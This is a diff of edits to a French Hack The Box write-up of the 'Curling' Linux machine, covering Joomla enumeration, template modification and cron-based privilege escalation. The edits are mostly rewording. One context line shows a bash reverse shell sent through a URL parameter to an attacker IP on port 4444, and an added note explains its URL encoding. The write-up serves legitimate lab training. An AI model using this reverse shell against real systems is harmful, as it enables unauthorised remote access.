@@ -135,10 +135,13 @@ La machine Curling est une box Linux Easy de Hack The Box centrée sur l’explo
 
 Contrairement à certaines machines HTB Easy reposant sur une vulnérabilité immédiate ou un service exposé évident, Curling demande surtout une analyse méthodique du contenu web et des indices laissés dans l’application.
 
-L’énumération initiale ne révèle qu’une surface d’attaque relativement réduite avec Joomla 3.8.8 sur le port HTTP.
- Les scans automatisés ne mettent en évidence aucune exploitation directe évidente, ce qui oblige à revenir à des vérifications plus manuelles : inspection du code source HTML, recherche de fichiers accessibles, analyse des contenus récupérés et exploration du panneau d’administration Joomla.
+L’énumération initiale révèle une surface d’attaque relativement réduite avec Joomla 3.8.8 exposé sur le port HTTP.
 
-La prise de pied s’effectue progressivement :
+Les scans automatisés ne mettent en évidence aucune exploitation directe évidente.
+
+L’analyse doit donc revenir vers des vérifications plus manuelles : inspection du code source HTML, recherche de fichiers accessibles, analyse des contenus récupérés et exploration du panneau d’administration Joomla.
+
+La prise pied s’effectue progressivement :
 
 - découverte d’un fichier sensible oublié sur le serveur ;
 - récupération d’identifiants Joomla ;
@@ -370,7 +373,7 @@ mon-recoweb curling.htb
 
 ```
 
-Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.
+Le fichier `RESULTS_SUMMARY.txt` regroupe les chemins découverts, sans parcourir l’ensemble des logs générés.
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
@@ -628,7 +631,7 @@ Une fois connecté à l’interface d’administration Joomla, tu cherches un mo
 
 ### Modification du template Joomla
 
-Le template actif utilisé par le site peut être identifié directement dans le code source HTML :
+Le template Joomla actif utilisé par le site peut être identifié directement dans le code source HTML, notamment via les chemins chargés dans `/templates/`:
 
 ```html
 /templates/protostar/
@@ -707,6 +710,8 @@ Puis via le navigateur :
 ```url
 http://curling.htb/?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.X/4444 0>%261'
 ```
+
+> Les caractères `%26` correspondent à l’encodage URL du caractère `&`, nécessaire ici pour transmettre correctement la commande via l’URL.
 
 Tu obtiens alors un reverse shell interactif en tant que :
 
@@ -902,7 +907,9 @@ curling
 
 ### pspy64
 
-Comme suggéré dans la recette {{< recette "privilege-escalation-linux" >}}, tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root `UID=0`.
+Comme suggéré dans la recette {{< recette "privilege-escalation-linux" >}}, tu lances également `pspy64` dans une deuxième session SSH.
+
+L’objectif est d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par `root` (`UID=0`).
 
 L’énumération locale révèle rapidement une tâche cron intéressante exécutée par `root` :
 
